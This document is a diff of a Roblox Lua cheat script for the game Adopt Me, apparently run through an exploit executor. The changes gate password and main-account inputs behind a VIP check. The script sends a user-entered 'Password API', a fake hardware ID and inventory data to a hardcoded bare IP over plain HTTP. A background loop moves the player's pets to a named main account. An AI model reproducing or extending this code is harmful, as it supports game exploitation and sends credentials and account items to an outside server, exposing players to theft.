@@ -853,7 +853,6 @@ autoNeonButton = AdoptMe:CreateToggle({
                 end
                 if isVIP and FakeHWID ~= nil then
                     if syn then
-                        print(passwordAPI)
                         local Response = syn.request({
                             Url = "http://141.144.230.49/ponerInventario",
                             Body = HttpService:JSONEncode({
@@ -1023,12 +1022,21 @@ local Input = AdoptMe:CreateInput({
     PlaceholderText = "Password API",
     RemoveTextAfterFocusLost = false,
     Callback = function(Text)
-        passwordAPI = Text
-        if syn then
-            syn.request({
-                Url = "http://141.144.230.49/ponerContra/"..FakeHWID.."/"..passwordAPI,
-                Method = "GET"
+        if not isVIP then
+            _G.Library:Notify({
+                Title = "VIP",
+                Content = "You're not a VIP member!, if u want to see more information, join the discord!",
+                Duration = 5.0,
+                Image = 4483362458,
             })
+        else
+            passwordAPI = Text
+            if syn then
+                syn.request({
+                    Url = "http://141.144.230.49/ponerContra/"..FakeHWID.."/"..passwordAPI,
+                    Method = "GET"
+                })
+            end
         end
     end,
 })
@@ -1038,7 +1046,16 @@ local Input = AdoptMe:CreateInput({
     PlaceholderText = "MainAccount Username",
     RemoveTextAfterFocusLost = false,
     Callback = function(Text)
-        MainAccount = Text
+        if not isVIP then
+            _G.Library:Notify({
+                Title = "VIP",
+                Content = "You're not a VIP member!, if u want to see more information, join the discord!",
+                Duration = 5.0,
+                Image = 4483362458,
+            })
+        else
+            MainAccount = Text 
+        end
     end,
 })
 
@@ -1070,7 +1087,7 @@ AdoptMe:CreateButton({
 
 spawn(function()
     while true do
-        if MainAccount ~= nil and game.Players.LocalPlayer.Name ~= MainAccount then
+        if isVIP and MainAccount ~= nil and game.Players.LocalPlayer.Name ~= MainAccount then
             if game:GetService("Players"):FindFirstChild(MainAccount) then
                 local Pets = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets or {}
                 for k,v in pairs(Pets) do
